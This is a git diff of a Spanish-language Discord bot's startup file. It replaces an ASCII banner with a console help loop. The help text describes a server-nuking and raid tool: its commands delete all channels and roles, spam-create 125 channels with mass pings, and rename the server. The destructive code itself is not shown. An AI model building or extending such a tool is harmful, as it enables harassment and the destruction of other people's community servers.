@@ -2,6 +2,12 @@ const Discord = require("discord.js");
 const fs = require('fs');
 const chalk = require('chalk');
 const { green } = require('chalk');
+const readline = require('readline').createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
+
+
 
 const client = new Discord.Client();
 client.commands = new Discord.Collection();
@@ -12,22 +18,41 @@ const {
     prefix,
     token,
 } = require('./config.json');
-client.once('ready', () => {
-    console.log((chalk.green(`Logeado como ${client.user.tag}`)));
-    console.log((chalk.red(`__________.__        ____  ___       `)));
-    console.log((chalk.red(`\\______   \\  |   ____\\   \\/  /___  ___`)));
-    console.log((chalk.yellow(` |     ___/  |  /  _ \\     / \\  \\/  /`)));
-    console.log((chalk.yellow(` |    |   |  |_(  <_> )     \\  >    < `)));
-    console.log((chalk.red(` |____|   |____/\\____/___/\\  \\/__/\\_ \\ `)));
-    console.log((chalk.red(`                           \\_/      \\/`)));
-    console.log((green('-----------COMANDOS-----------')));
-    console.log((chalk.green('[+].on -> Borra todos los canales y crea uno avisando que el server ha sido destruido')));
-    console.log((chalk.green('[+].raid -> Crea 125 canales con 38 pings en cada uno [Recomendado usar después de .on]')));
-    console.log((chalk.green('[+].roles -> Borra todos los roles del servidor y crea 75 nuevos')));
-    console.log((chalk.green('[+].seticon -> Cambia la imagen del servidor')))
-    console.log((chalk.green('[+].setname -> Cambia el nombre del servidor')))
-    console.log((chalk.green('==================================================')));
-});
+client.once('ready', () => { help()
+    console.log(chalk.red(`
+     ▄▄▄·▄▄▌        ▐▄• ▄ ▐▄• ▄ 
+    ▐█ ▄███•  ▪      █▌█▌▪ █▌█▌▪
+     ██▀·██▪   ▄█▀▄  ·██·  ·██· 
+    ▐█▪·•▐█▌▐▌▐█▌.▐▌▪▐█·█▌▪▐█·█▌
+    .▀   .▀▀▀  ▀█▄▀▪•▀▀ ▀▀•▀▀ ▀▀   
+
+
+    |.on|                  |.raid|
+    |.roles|            |.seticon|
+             |.setname| 
+             
+    Duda con algun comando? Escribelo!
+    `
+    ))
+    function help(){
+        readline.question('', comando => {
+            if (comando === '.on') {
+                console.log(chalk.red('Borra todos los canales y crea uno'))}
+            if (comando === '.raid') {
+                console.log(chalk.red('Crea 125 canales con spam'))} 
+            if (comando === '.roles') {
+                console.log(chalk.red('Borra todos los roles por debajo del bot y crea 75 nuevos'))}
+            if (comando === '.seticon') {
+                console.log(chalk.red('Cambia el icono del server'))} 
+            if (comando === '.setname') {
+                console.log(chalk.red('Cambia el nombre del servidor'))} 
+                help()
+            
+        })
+    }}
+
+    
+);
 
 client.login(token);
 
